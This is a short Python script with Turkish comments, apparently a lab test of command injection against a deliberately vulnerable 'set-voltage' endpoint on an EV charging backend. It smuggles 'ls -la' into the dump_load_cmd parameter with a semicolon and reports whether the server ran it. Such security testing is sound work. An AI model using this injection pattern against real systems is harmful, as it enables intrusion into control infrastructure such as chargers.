import requests

BACKEND = "https://evcs-backend-samet.onrender.com"

print("⚡ COMMAND INJECTION TEST (CORRECTED)\n")

# Normal istek
print("1. Normal İstek:")
try:
    # NOTE: The server expects Query Parameters, not JSON body!
    r = requests.post(
        f"{BACKEND}/vulnerable/set-voltage",
        params={"voltage_value": "400", "dump_load_cmd": "enable"}
    )
    print(f"   Sonuç: {r.json()}\n")
except Exception as e:
    print(f"Error connecting to backend: {e}")

# SALDIRI: Noktalı virgül (;) ile komut ekle!
print("2. SALDIRI (ls komutu):")
payload = {
    "voltage_value": "400",
    "dump_load_cmd": "enable; ls -la; #"
}
# Açıklama:
# enable    -> İlk komut
# ;         -> Komut ayırıcı
# ls -la    -> Dosyaları listele (BİZİM KOMUT)
# ; #       -> Geri kalanını yoksay

try:
    r = requests.post(
        f"{BACKEND}/vulnerable/set-voltage", 
        params=payload
    )
    result = r.json()

    print(f"   Enjekte Edilen: {result.get('injected_command')}")
    if "vulnerability" in result:
        print("✅✅✅ BAŞARILI! Kod Sunucuda Çalıştı! ✅✅✅")
        print(f"⚠️ {result['warning']}")
    else:
        print("❌ Saldırı başarısız oldu (veya sunucu simülasyon modunda değil)")
        print(result)

except Exception as e:
    print(f"Error connecting to backend: {e}")
